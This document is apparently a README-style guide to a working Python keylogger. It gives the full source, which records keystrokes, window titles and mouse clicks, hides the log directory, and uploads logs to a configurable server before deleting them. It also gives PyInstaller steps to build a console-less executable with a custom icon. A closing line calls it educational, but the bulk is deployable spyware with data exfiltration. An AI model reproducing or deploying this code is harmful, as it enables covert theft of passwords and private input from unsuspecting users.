# Documentation and Code Guide

## Overview

This Python script is designed to run a keylogger that captures keystrokes and mouse clicks, logs them, and uploads log files to a specified server. It includes functionalities to manage log files, handle cleanup, and ensure graceful shutdown.

### Key Features

- **Keylogging:** Captures keystrokes and mouse clicks.
- **Log Management:** Logs keystrokes and mouse events to files.
- **File Upload:** Uploads log files to a specified server.
- **Cleanup:** Deletes old log files and removes uploaded files.
- **Graceful Shutdown:** Ensures clean termination and deletion of uploaded files.

## Prerequisites

- Python 3.x
- Required Python packages: `pynput`, `requests`, `pygetwindow` (if retrieving active window title)
- Internet access for file uploads

## Setup

1. **Install Required Packages**

   ```bash
   pip install pynput requests pygetwindow
   ```

2. **Configure Server URL**

    Update the SERVER_URL variable with your server's upload URL:
    ```
    SERVER_URL = 'https://yourserver.com/upload'
    ```

## Code Explanation

### Imports

```
from pynput import keyboard, mouse
import os
import platform
import time
import requests
import getpass
import atexit
from datetime import datetime
from threading import Thread
import signal
import sys
```

- **pynput:** Provides functionality to listen to keyboard and mouse events.
- **os, platform, sys:** For file system operations and OS-specific functionality.
- **time:** For handling delays and timestamps.
- **requests:** For making HTTP requests to upload files.
- **getpass:** Retrieves the current user's name.
- **atexit:** Registers functions to be executed upon program termination.
- **datetime:** For generating timestamps for file names and log entries.
- **threading:** Facilitates concurrent execution of tasks.
- **signal:** Manages termination signals for graceful shutdown.

### Constants

```
SERVER_URL = 'https://yourserver.com/upload'
LOG_DIR = 'hidden_logs'
UPLOADED_FILES_LOG = os.path.join(LOG_DIR, 'uploaded_files.log')
```

- **SERVER_URL:** URL where log files are uploaded.
- **LOG_DIR:** Directory where log files are stored.
- **UPLOADED_FILES_LOG:** Path to the log file that tracks uploaded files.

### Functions

#### `get_pc_username()`

Retrieves the current PC username.

```
def get_pc_username():
    return getpass.getuser()
```

#### `generate_log_file_name()`

Generates a unique log file name incorporating the username and current timestamp.

```
def generate_log_file_name():
    username = get_pc_username()
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    return f'keylog_{username}_{timestamp}.txt'
```

#### `create_hidden_dir()`

Creates a hidden directory for storing logs based on the operating system.

```
def create_hidden_dir():
    system = platform.system()
    if not os.path.exists(LOG_DIR):
        os.makedirs(LOG_DIR)
        if system == 'Windows':
            import ctypes
            try:
                ctypes.windll.kernel32.SetFileAttributesW(LOG_DIR, 2)  # FILE_ATTRIBUTE_HIDDEN
            except Exception as e:
                print(f"Error hiding directory on Windows: {e}")
        elif system == 'Darwin' or system == 'Linux':
            hidden_dir_path = f".{LOG_DIR}"
            try:
                os.rename(LOG_DIR, hidden_dir_path)
            except Exception as e:
                print(f"Error hiding directory on macOS/Linux: {e}")
```
            
#### `upload_file(file_path)`

Uploads a specified file to the server.

```
def upload_file(file_path):
    try:
        with open(file_path, 'rb') as file:
            response = requests.post(SERVER_URL, files={'file': file})
            if response.status_code == 200:
                print(f"Successfully uploaded file: {file_path}")
                log_uploaded_file(file_path)
            else:
                print(f"Failed to upload file: {file_path}. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error uploading file {file_path}: {e}")
```

#### `log_uploaded_file(file_path)`

Logs the path of the uploaded file.

```
def log_uploaded_file(file_path):
    with open(UPLOADED_FILES_LOG, 'a', encoding='utf-8') as log_file:
        log_file.write(file_path + '\n')
```

#### `is_file_uploaded(file_path)`

Checks if a file has already been uploaded by consulting the log.

```
def is_file_uploaded(file_path):
    if not os.path.exists(UPLOADED_FILES_LOG):
        return False
    with open(UPLOADED_FILES_LOG, 'r', encoding='utf-8') as log_file:
        uploaded_files = log_file.read().splitlines()
    return file_path in uploaded_files
```

#### `delete_uploaded_file_if_opened(file_path)`

Deletes a file if it has been marked as uploaded.

```
def delete_uploaded_file_if_opened(file_path):
    if is_file_uploaded(file_path):
        try:
            os.remove(file_path)
            print(f"Uploaded file deleted: {file_path}")
        except Exception as e:
            print(f"Error deleting file {file_path}: {e}")
```

#### `delete_old_files(directory='.')`

Deletes old log files that are older than 24 hours.

```
def delete_old_files(directory='.'):
    now = time.time()
    for filename in os.listdir(directory):
        if filename.startswith('keylog_') and filename.endswith('.txt'):
            file_path = os.path.join(directory, filename)
            file_age = now - os.path.getmtime(file_path)
            if file_age > 24 * 60 * 60:
                try:
                    os.remove(file_path)
                    print(f"Deleted old file: {file_path}")
                except Exception as e:
                    print(f"Error deleting file {file_path}: {e}")
```

#### `cleanup_thread()`

Periodically checks and deletes old log files.

```
def cleanup_thread():
    while True:
        delete_old_files(LOG_DIR)
        time.sleep(60 * 60)
```

#### `cleanup_uploaded_files()`

Deletes all files that have been uploaded, as recorded in the log.

```
def cleanup_uploaded_files():
    if os.path.exists(UPLOADED_FILES_LOG):
        with open(UPLOADED_FILES_LOG, 'r', encoding='utf-8') as log_file:
            uploaded_files = log_file.read().splitlines()
        for file_path in uploaded_files:
            if os.path.exists(file_path):
                try:
                    os.remove(file_path)
                    print(f"Deleted uploaded file: {file_path}")
                except Exception as e:
                    print(f"Error deleting file {file_path}: {e}")
```

#### `flush_buffer()`

Flushes the buffer, writing the accumulated keystrokes to the log file.

```
def flush_buffer():
    if buffer:
        word = ''.join(buffer)
        buffer.clear()
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        window_title = get_active_window_title()
        log_str = f'{timestamp} - {window_title} - {word}\n'
        with open(log_file_path, 'a', encoding='utf-8') as log_file:
            log_file.write(log_str)
```

#### `on_press(key)`

Handles keyboard events and updates the buffer.

```
def on_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            buffer.append(key.char)
        elif key == keyboard.Key.space:
            buffer.append(' ')
            flush_buffer()
        elif key == keyboard.Key.enter:
            flush_buffer()
        elif key in [keyboard.Key.tab, keyboard.Key.backspace]:
            flush_buffer()
    except Exception as e:
        print(f"Error processing key: {e}")
```

#### `on_click(x, y, button, pressed)`

Handles mouse click events to flush the buffer.

```
def on_click(x, y, button, pressed):
    if pressed:
        flush_buffer()
```

#### `get_active_window_title()`

Retrieves the title of the currently active window.

```
def get_active_window_title():
    try:
        import pygetwindow as gw
        return gw.getActiveWindow().title
    except Exception as e:
        return f"Error retrieving window title: {e}"
```

#### `upload_new_files()`

Uploads log files that have not yet been uploaded.

```
def upload_new_files():
    log_files = [f for f in os.listdir(LOG_DIR) if f.startswith('keylog_') and f.endswith('.txt')]
    for file in log_files:
        file_path = os.path.join(LOG_DIR, file)
        if not is_file_uploaded(file_path):
            upload_file(file_path)
```

#### `handle_quit_signal(signum, frame)`

Handles termination signals to ensure a clean shutdown.

```
def handle_quit_signal(signum, frame):
    global keylogger_thread, cleanup_thread_instance, mouse_listener_thread
    print("Terminating program...")
    flush_buffer()
    if keylogger_thread:
        keylogger_thread.join(timeout=1)
    if cleanup_thread_instance:
        cleanup_thread_instance.join(timeout=1)
    if mouse_listener_thread:
        mouse_listener_thread.join(timeout=1)
    sys.exit(0)
```

### Main Execution

```

def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def start_mouse_listener():
    with mouse.Listener(on_click=on_click) as mouse_listener:
        mouse_listener.join()

upload_new_files()

keylogger_thread = Thread(target=start_keylogger)
keylogger_thread.start()

cleanup_thread_instance = Thread(target=cleanup_thread, daemon=True)
cleanup_thread_instance.start()

mouse_listener_thread = Thread(target=start_mouse_listener)
mouse_listener_thread.start()

```
## Creating an Executable File

To convert this Python script into an executable file, follow these steps:

### 1. **Install PyInstaller**

PyInstaller is a popular tool for creating standalone executables from Python scripts.

```
pip install pyinstaller
```

### 2. **Create the Executable**

Use PyInstaller to create an executable file. Run the following command in your terminal or command prompt:

```
pyinstaller --onefile --noconsole --icon=icon.ico CustomName keylogger.py
```

- `--onefile`: Packages everything into a single executable file.
- `--noconsole`: (Optional) Hides the console window (useful for GUI applications).
- `--icon`: (Optional) set a custom icon for the executable file.

Replace `CustomName` with your desired executable name.

### 3. **Locate the Executable**

After running the above command, PyInstaller will create a `dist` directory in your project folder. The executable file will be located in this directory.

### 4. **Test the Executable**

Run the executable to ensure that it works as expected. Verify that it performs all the intended functions and handles errors appropriately.

### Important Notes

- **Permissions:** Ensure that you have the necessary permissions to create and execute files on your system.
- **Dependencies:** PyInstaller bundles most dependencies, but make sure all required libraries are included.
- **Security:** Be cautious when distributing or using executables, especially those involving sensitive operations.

By following these steps, you can create a standalone executable file for your Python script, making it easier to deploy and run on systems without requiring a Python interpreter.

**Note:** This script is designed for educational purposes and should not be used for unauthorized monitoring or tracking of users. Always ensure compliance with legal and ethical standards before deploying any form of monitoring software.
